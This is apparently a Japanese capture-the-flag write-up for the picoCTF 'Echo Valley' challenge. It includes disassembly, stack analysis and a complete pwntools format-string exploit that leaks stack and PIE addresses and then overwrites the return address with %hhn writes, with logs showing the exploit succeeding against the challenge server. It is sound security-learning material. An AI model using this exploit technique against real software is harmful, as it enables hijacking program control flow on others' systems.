#### Echo Valley（300 points）

1つの C言語のソースコード（valley.c）と、1つのバイナリプログラム（valley）をダウンロードできます。また、サーバを起動して進める問題のようです。

<figure class="figure-image figure-image-fotolife" title="Echo Valley（300 points）">[f:id:daisuke20240310:20250316185026p:plain:alt=Echo Valley（300 points）]<figcaption>Echo Valley（300 points）</figcaption></figure>

まず、ソースコードです。echo_valley関数では、ユーザ入力と、`printf(buf)` があり、無限ループになっています。書式文字列攻撃が出来そうです（何でもできそうな関数です）。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```

表層解析を行います。だいぶ厳しい条件です。

最終的に、print_flag関数にジャンプする必要がありますが、スタックカナリアが有効なので、リターンアドレスの書き換えは難しそうです。また、 Full RELRO なので、GOT書き換えも出来ないようです。

```sh
$ file valley
valley: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=389c2641f0d3caae81af5d21d9bb5bcf2de217f0, for GNU/Linux 3.2.0, with debug_info, not stripped

$ ~/bin/checksec --file=valley
RELRO       STACK CANARY  NX          PIE          RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Full RELRO  Canary found  NX enabled  PIE enabled  No RPATH  No RUNPATH  49 Symbols  No       0          2            valley

$ pwn checksec --file=valley
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

とりあえず、GDB で起動して、アセンブラを見てみます。main関数のアセンブラです。main関数には、スタックカナリアは入ってないようです。

```asm
pwndbg> disassemble 
Dump of assembler code for function main:
   0x0000555555555401 <+0>:	endbr64
   0x0000555555555405 <+4>:	push   rbp
   0x0000555555555406 <+5>:	mov    rbp,rsp
=> 0x0000555555555409 <+8>:	mov    eax,0x0
   0x000055555555540e <+13>:	call   0x555555555307 <echo_valley>
   0x0000555555555413 <+18>:	mov    eax,0x0
   0x0000555555555418 <+23>:	pop    rbp
   0x0000555555555419 <+24>:	ret
End of assembler dump.
```

続いて、echo_valley関数ののアセンブラです。

```asm
dwndbg> disassemble 
Dump of assembler code for function echo_valley:
   0x0000555555555307 <+0>:	endbr64
   0x000055555555530b <+4>:	push   rbp
   0x000055555555530c <+5>:	mov    rbp,rsp
   0x000055555555530f <+8>:	sub    rsp,0x70
=> 0x0000555555555313 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x000055555555531c <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000555555555320 <+25>:	xor    eax,eax
   0x0000555555555322 <+27>:	lea    rax,[rip+0xd37]        # 0x555555556060
   0x0000555555555329 <+34>:	mov    rdi,rax
   0x000055555555532c <+37>:	call   0x5555555550e0 <puts@plt>
   0x0000555555555331 <+42>:	mov    rax,QWORD PTR [rip+0x2cd8]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x0000555555555338 <+49>:	mov    rdi,rax
   0x000055555555533b <+52>:	call   0x555555555140 <fflush@plt>
   0x0000555555555340 <+57>:	mov    rdx,QWORD PTR [rip+0x2cd9]        # 0x555555558020 <stdin@GLIBC_2.2.5>
   0x0000555555555347 <+64>:	lea    rax,[rbp-0x70]
   0x000055555555534b <+68>:	mov    esi,0x64
   0x0000555555555350 <+73>:	mov    rdi,rax
   0x0000555555555353 <+76>:	call   0x555555555120 <fgets@plt>
   0x0000555555555358 <+81>:	test   rax,rax
   0x000055555555535b <+84>:	jne    0x555555555376 <echo_valley+111>
   0x000055555555535d <+86>:	lea    rax,[rip+0xd27]        # 0x55555555608b
   0x0000555555555364 <+93>:	mov    rdi,rax
   0x0000555555555367 <+96>:	call   0x5555555550e0 <puts@plt>
   0x000055555555536c <+101>:	mov    edi,0x0
   0x0000555555555371 <+106>:	call   0x555555555170 <exit@plt>
   0x0000555555555376 <+111>:	lea    rax,[rbp-0x70]
   0x000055555555537a <+115>:	lea    rdx,[rip+0xd24]        # 0x5555555560a5
   0x0000555555555381 <+122>:	mov    rsi,rdx
   0x0000555555555384 <+125>:	mov    rdi,rax
   0x0000555555555387 <+128>:	call   0x555555555130 <strcmp@plt>
   0x000055555555538c <+133>:	test   eax,eax
   0x000055555555538e <+135>:	jne    0x5555555553c1 <echo_valley+186>
   0x0000555555555390 <+137>:	lea    rax,[rip+0xd14]        # 0x5555555560ab
   0x0000555555555397 <+144>:	mov    rdi,rax
   0x000055555555539a <+147>:	call   0x5555555550e0 <puts@plt>
   0x000055555555539f <+152>:	nop
   0x00005555555553a0 <+153>:	mov    rax,QWORD PTR [rip+0x2c69]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x00005555555553a7 <+160>:	mov    rdi,rax
   0x00005555555553aa <+163>:	call   0x555555555140 <fflush@plt>
   0x00005555555553af <+168>:	nop
   0x00005555555553b0 <+169>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00005555555553b4 <+173>:	sub    rax,QWORD PTR fs:0x28
   0x00005555555553bd <+182>:	je     0x5555555553ff <echo_valley+248>
   0x00005555555553bf <+184>:	jmp    0x5555555553fa <echo_valley+243>
   0x00005555555553c1 <+186>:	lea    rax,[rip+0xcf9]        # 0x5555555560c1
   0x00005555555553c8 <+193>:	mov    rdi,rax
   0x00005555555553cb <+196>:	mov    eax,0x0
   0x00005555555553d0 <+201>:	call   0x555555555110 <printf@plt>
   0x00005555555553d5 <+206>:	lea    rax,[rbp-0x70]
   0x00005555555553d9 <+210>:	mov    rdi,rax
   0x00005555555553dc <+213>:	mov    eax,0x0
   0x00005555555553e1 <+218>:	call   0x555555555110 <printf@plt>
   0x00005555555553e6 <+223>:	mov    rax,QWORD PTR [rip+0x2c23]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x00005555555553ed <+230>:	mov    rdi,rax
   0x00005555555553f0 <+233>:	call   0x555555555140 <fflush@plt>
   0x00005555555553f5 <+238>:	jmp    0x555555555331 <echo_valley+42>
   0x00005555555553fa <+243>:	call   0x555555555100 <__stack_chk_fail@plt>
   0x00005555555553ff <+248>:	leave
   0x0000555555555400 <+249>:	ret
End of assembler dump.
```

何でもできそうだと思いましたが、なかなか難しいです。echo_valley関数のスタックを可視化してみます。シンプルですね。

| アドレス | サイズ | 内容 |
| - | - | - |
| rbp - 0x70 | 100 | buf（rsp） |
| rbp - 0x0C | 4 | 空き |
| rbp - 0x08 | 8 | スタックカナリア |
| rbp |

もしかすると、書式文字列攻撃の任意のアドレスの値を書き換える方法で、スタックカナリアを壊さずに、ピンポイントにリターンアドレスを書き換えることが出来るかもしれません。その場合、このプログラムバイナリ（valley）のベースアドレスを求めるため、先ほどの問題と同様に、main関数のアドレスを先に出力しておく必要があります。

また、任意のアドレスの値が書き換えられるなら、スタックカナリアをリークしておいて、リターンアドレスを書き換えた後、スタックカナリアを書き戻すことも出来るかもしれません。こちらは 2回書き換えが必要なので、前者の方法で進めてみます。

まずは、main関数のアドレスをリークしてみます。GDB で、スタックの内容をダンプしてみました。main関数のアドレスが確認できます。書式文字列攻撃で、この位置を指定するには、引数のうち、レジスタが 5個分あり、その後のスタックが、19個分あるので、計24個分ですね。

```sh
pwndbg> tele 20
00:0000│ rsp 0x7fffffffdd70 ?? 0
... ↓        13 skipped
0e:0070│ rbp 0x7fffffffdde0 ?? 0x7fffffffddf0 ?? 1
0f:0078│+008 0x7fffffffdde8 ?? 0x555555555413 (main+18) ?? mov eax, 0
10:0080│+010 0x7fffffffddf0 ?? 1
11:0088│+018 0x7fffffffddf8 ?? 0x7ffff7df024a (__libc_start_call_main+122) ?? mov edi, eax
12:0090│+020 0x7fffffffde00 ?? 0
13:0098│+028 0x7fffffffde08 ?? 0x555555555401 (main) ?? endbr64 
```

`AAAAAAAA,%20$p,%21$p,%22$p,%23$p,%24$p,%25$p,%26$p,%27$p,%28$p,%29$p,%30$p,%31$p` を入力してみると、`You heard in the distance: AAAAAAAA,0x7fffffffddf0,0x555555555413,0x1,0x7ffff7df024a,(nil),0x555555555401,0x100000000,0x7fffffffdf08,0x7fffffffdf08,0x134c6decb129cd3c,(nil),0x7fffffffdf18` と出力されました。いっぱい出力しましたが、`%25$p` で、main関数のアドレスを出力できることが分かりました。

上の `0f:0078│+008 0x7fffffffdde8 ?? 0x555555555413 (main+18) ?? mov eax, 0` は、echo_valley関数の戻り番地です。ここを、print_flag関数のアドレスに書き換えたいわけです。今回の場合は、print_flag関数のアドレスは以下です。下位2byteを書き換えればいいですね。2byteを一気に書き換えようとすると、空白の出力が数万個になってしまうかもしれないので、書き換えは、1byteずつ行います。あ、書き換え先のアドレスのリークも必要でした。rbp に、スタックのアドレスが入ってるいるようなので、これは、上の `%20$p` で、これを -8 したところが書き換えたいアドレスになります。1byteずつ書き換えるので、そのアドレスに 0x69 を書き込み、+1 したところに 0x52 を書き込むことになります。ページ単位にしかアドレスはランダム化されないので、これより上位のアドレスは書き換える必要はありません。

では、実装していきます。デバッグコードもいくつか入ってますが、何とかできました。

```python
#!/usr/bin/env python3
from pwn import *

bin_file = './valley'
context( os = 'linux', arch = 'amd64' )
# context.log_level = 'debug'

binf                = ELF( bin_file )
addr_main_offset    = binf.functions['main'].address
addr_flag_offset    = binf.functions['print_flag'].address
#addr_got_setbuf    = binf.got['setbuf']
addr_bss            = binf.bss()

diff = addr_main_offset - addr_flag_offset

info( f"addr_main_offset=0x{addr_main_offset:08X}, addr_flag_offset=0x{addr_flag_offset:08X}" )

def attack( proc, **kwargs ):
    
    if False:
        proc.sendlineafter( ': ', b'AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p' )
        info( proc.recvline() )
        info( proc.recvline() )
    else:
        proc.sendlineafter( ': ', b'%20$p %25$p'.ljust(16, b' ') )
    
    info( proc.recvuntil(': ') ) # You heard in the distance: 
    
    if True:
        addr = proc.recvline().decode('utf-8')
        lst_addr = addr.split()
        info( f"addr={addr}, lst_addr[0]={lst_addr[0]}, lst_addr[1]={lst_addr[1]}" )
        addr_stack = int( lst_addr[0], 16 ) - 8
        addr_main  = int( lst_addr[1], 16 )
        #addr_main = unpack( proc.recv(6), 'all' )
    
    else:
        info( proc.recvline() )
        info( proc.recvline() )
        info( proc.recvline() )
    
    addr_flag = addr_main - diff
    
    info( f"addr_main=0x{addr_main:08x}, addr_flag=0x{addr_flag:08x}, addr_stack=0x{addr_stack:08x}" )
    second = (addr_flag >> 8) & 0xFF
    first  = addr_flag        & 0xFF
    if first < second:
        ss = f"%{first}x%9$hhn%{second - first}x%10$hhn"
        info( f"first < second: ss={ss}" )
        proc.sendline( ss.encode('utf-8').ljust(24, b' ') + p64(addr_stack) + p64(addr_stack+1) ) # 0x4A 0x61
    else:
        ss = f"%{second}x%9$hhn%{first - second}x%10$hhn"
        info( f"first > second: ss={ss}" )
        proc.sendline( ss.encode('utf-8').ljust(24, b' ') + p64(addr_stack+1) + p64(addr_stack) )
    
    proc.sendline( b'exit' )
    
    info( proc.recvrepeat() )
    info( proc.recvline() )
    info( proc.recvline() )
    info( proc.recvline() )

def main():
    
    adrs = "shape-facility.picoctf.net"
    #adrs = "localhost"
    port = 60833
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
``` 

フラグの位置が、"/home/valley/flag.txt" に固定されているので、フォルダを作って、ファイルを配置しました。では、実行してみます。まずは、ローカルのバイナリファイルに対して実行します。出ました！

```sh
$ python exploit_valley.py 
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[*] addr_main_offset=0x00001401, addr_flag_offset=0x00001269
[+] Starting local process './valley': pid 241006
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/exploit_valley.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  info( proc.recvuntil(': ') ) # You heard in the distance:
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] 
    You heard in the distance: 
[*] addr=0x7fffbd31aca0 0x558d41331401     
    , lst_addr[0]=0x7fffbd31aca0, lst_addr[1]=0x558d41331401
[*] addr_main=0x558d41331401, addr_flag=0x558d41331269, addr_stack=0x7fffbd31ac98
[*] first > second: ss=%18x%9$hhn%87x%10$hhn
[*] Process './valley' stopped with exit code 0 (pid 241006)
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] You heard in the distance:           413320c1                                                                                      0   ?1??\x7fThe Valley Disappears
    Congrats! Here is your flag: picoCTF{deadbeef}
Traceback (most recent call last):
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/exploit_valley.py", line 78, in <module>
    main()
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/exploit_valley.py", line 74, in main
    attack( proc )
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/exploit_valley.py", line 59, in attack
    info( proc.recvline() )
          ^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 498, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/process.py", line 714, in recv_raw
    raise EOFError
EOFError
```

しかし、またもや、サーバで実行すると、うまくいきません。。一応、ローカルで、socatコマンドを使った環境でも試してみます。

```sh
$ socat TCP-LISTEN:4000,reuseaddr,fork EXEC:"./valley"
```

では、実行してみます。こちらも成功しました。

```sh
$ python exploit_valley.py 
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[*] addr_main_offset=0x00001401, addr_flag_offset=0x00001269
[+] Opening connection to localhost on port 4000: Done
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/exploit_valley.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  info( proc.recvuntil(': ') ) # You heard in the distance:
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] 
    You heard in the distance: 
[*] addr=0x7ffe3d153570 0x562b1d88a401     
    , lst_addr[0]=0x7ffe3d153570, lst_addr[1]=0x562b1d88a401
[*] addr_main=0x562b1d88a401, addr_flag=0x562b1d88a269, addr_stack=0x7ffe3d153568
[*] first < second: ss=%105x%9$hhn%57x%10$hhn
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] You heard in the distance:                                                                                                  1d88b0c1                                                        0  h5\x15=?\x7fThe Valley Disappears
    Congrats! Here is your flag: picoCTF{deadbeef}
Traceback (most recent call last):
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/exploit_valley.py", line 78, in <module>
    main()
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/exploit_valley.py", line 74, in main
    attack( proc )
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/exploit_valley.py", line 59, in attack
    info( proc.recvline() )
          ^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 498, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/sock.py", line 35, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to localhost port 4000
```

ローカルだとうまくいくけど、サーバでは失敗するというのが、今回だけで 2回目です。もちろん、成功してる方がいるので、私の実装か、環境の問題だと思いますが、残念です。もう、残り時間は少ないですが、最後の問題に進みます。

##### 後日の解き直し（2025/5/13）

こちらも、考え直します。

こちらも同じく、main関数のアドレスが取得して、エクスプロイトできると思って実装していましたが、なぜか、サーバだとうまくいかないので、戻り番地を使ってアドレス計算していきます。

変更後の attack関数だけを貼ります。

main関数ではなく、戻り番地のアドレスから計算するように変更しています。

```python
def attack( proc, **kwargs ):
    
    if False:
        proc.sendlineafter( ': ', b'AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p' )
        info( proc.recvline() )
        info( proc.recvline() )
    else:
        #proc.sendlineafter( 'Shouting: ', b'%20$p %25$p'.ljust(16, b' ') )
        proc.sendlineafter( 'Shouting: ', b'%20$p %21$p'.ljust(16, b' ') )
    
    info( proc.recvuntil('distance: ') ) # You heard in the distance: 
    
    if True:
        addr = proc.recvline().decode('utf-8')
        lst_addr = addr.split()
        info( f"addr={addr}, lst_addr[0]={lst_addr[0]}, lst_addr[1]={lst_addr[1]}" )
        addr_stack = int( lst_addr[0], 16 ) - 8
        addr_main  = int( lst_addr[1], 16 ) - 18
        #addr_main = unpack( proc.recv(6), 'all' )
    
    else:
        info( proc.recvline() )
        info( proc.recvline() )
        info( proc.recvline() )
    
    addr_flag = addr_main - diff
    
    info( f"addr_main=0x{addr_main:08x}, addr_flag=0x{addr_flag:08x}, addr_stack=0x{addr_stack:08x}" )
    second = (addr_flag >> 8) & 0xFF
    first  = addr_flag        & 0xFF
    if first < second:
        ss = f"%{first}x%9$hhn%{second - first}x%10$hhn"
        info( f"first < second: ss={ss}" )
        proc.sendline( ss.encode('utf-8').ljust(24, b' ') + p64(addr_stack) + p64(addr_stack+1) ) # 0x4A 0x61
    else:
        ss = f"%{second}x%9$hhn%{first - second}x%10$hhn"
        info( f"first > second: ss={ss}" )
        proc.sendline( ss.encode('utf-8').ljust(24, b' ') + p64(addr_stack+1) + p64(addr_stack) )
    
    proc.sendline( b'exit' )
    
    info( proc.recvall() )
```

実行します。何度かやったのですが、うまくいくこともあれば、うまくいかないこともありました。以下は、うまくいかなかった場合と、うまくいった場合の結果です。

何か、不確実な内容を含んでいるかもしれませんが、サーバの場合はデバッグが困難であることと、まぁ、CTF なので、ここまでとします。

```sh
$ python exploit_valley.py
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/EchoValley/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[*] addr_main_offset=0x00001401, addr_flag_offset=0x00001269
[+] Opening connection to shape-facility.picoctf.net on port 64417: Done
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x2b bytes:
    b'Welcome to the Echo Valley, Try Shouting: \n'
[DEBUG] Sent 0x11 bytes:
    b'%20$p %21$p     \n'
/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/EchoValley/exploit_valley.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  info( proc.recvuntil('distance: ') ) # You heard in the distance:
[DEBUG] Received 0x3e bytes:
    b'You heard in the distance: 0x7ffc3fb0bab0 0x5b6949e40413     \n'
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*]
    You heard in the distance:
[*] addr=0x7ffc3fb0bab0 0x5b6949e40413
    , lst_addr[0]=0x7ffc3fb0bab0, lst_addr[1]=0x5b6949e40413
[*] addr_main=0x5b6949e40401, addr_flag=0x5b6949e40269, addr_stack=0x7ffc3fb0baa8
[*] first > second: ss=%2x%9$hhn%103x%10$hhn
[DEBUG] Sent 0x29 bytes:
    00000000  25 32 78 25  39 24 68 68  6e 25 31 30  33 78 25 31  x%2x%x9$hhxn%10x3x%1x
    00000010  30 24 68 68  6e 20 20 20  a9 ba b0 3f  fc 7f 00 00  x0$hhxn   x????x????x
    00000020  a8 ba b0 3f  fc 7f 00 00  0a                        x????x????x?x
    00000029
[DEBUG] Sent 0x5 bytes:
    b'exit\n'
[+] Receiving all data: Done (169B)
[DEBUG] Received 0x93 bytes:
    00000000  59 6f 75 20  68 65 61 72  64 20 69 6e  20 74 68 65  xYou xhearxd inx thex
    00000010  20 64 69 73  74 61 6e 63  65 3a 20 33  33 62 39 39  x disxtancxe: 3x3b99x
    00000020  35 63 30 20  20 20 20 20  20 20 20 20  20 20 20 20  x5c0 x    x    x    x
    00000030  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  x    x    x    x    x
    *
    00000080  20 20 20 20  20 20 20 20  20 30 20 20  20 a9 ba b0  x    x    x 0  x ???x
    00000090  3f fc 7f                                            x???x
    00000093
[DEBUG] Received 0x16 bytes:
    b'The Valley Disappears\n'
[*] Closed connection to shape-facility.picoctf.net port 64417
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] You heard in the distance: 33b995c0                                                                                                      0   ??°??\x7fThe Valley Disappears

$ python exploit_valley.py
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/EchoValley/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[*] addr_main_offset=0x00001401, addr_flag_offset=0x00001269
[+] Opening connection to shape-facility.picoctf.net on port 64417: Done
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x2b bytes:
    b'Welcome to the Echo Valley, Try Shouting: \n'
[DEBUG] Sent 0x11 bytes:
    b'%20$p %21$p     \n'
/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/EchoValley/exploit_valley.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  info( proc.recvuntil('distance: ') ) # You heard in the distance:
[DEBUG] Received 0x3e bytes:
    b'You heard in the distance: 0x7ffda1f4ee60 0x625be7421413     \n'
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*]
    You heard in the distance:
[*] addr=0x7ffda1f4ee60 0x625be7421413
    , lst_addr[0]=0x7ffda1f4ee60, lst_addr[1]=0x625be7421413
[*] addr_main=0x625be7421401, addr_flag=0x625be7421269, addr_stack=0x7ffda1f4ee58
[*] first > second: ss=%18x%9$hhn%87x%10$hhn
[DEBUG] Sent 0x29 bytes:
    00000000  25 31 38 78  25 39 24 68  68 6e 25 38  37 78 25 31  x%18xx%9$hxhn%8x7x%1x
    00000010  30 24 68 68  6e 20 20 20  59 ee f4 a1  fd 7f 00 00  x0$hhxn   xY???x????x
    00000020  58 ee f4 a1  fd 7f 00 00  0a                        xX???x????x?x
    00000029
[DEBUG] Sent 0x5 bytes:
    b'exit\n'
[+] Receiving all data: Done (222B)
[DEBUG] Received 0x8d bytes:
    00000000  59 6f 75 20  68 65 61 72  64 20 69 6e  20 74 68 65  xYou xhearxd inx thex
    00000010  20 64 69 73  74 61 6e 63  65 3a 20 20  20 20 20 20  x disxtancxe:  x    x
    00000020  20 20 20 20  20 65 62 37  39 64 35 63  30 20 20 20  x    x eb7x9d5cx0   x
    00000030  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  x    x    x    x    x
    *
    00000080  20 20 20 30  20 20 20 59  ee f4 a1 fd  7f           x   0x   Yx????x?x
    0000008d
[DEBUG] Received 0x51 bytes:
    b'The Valley Disappears\n'
    b'Congrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}\n'
[*] Closed connection to shape-facility.picoctf.net port 64417
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] You heard in the distance:           eb79d5c0                                                                                      0   Y????\x7fThe Valley Disappears
    Congrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}
```
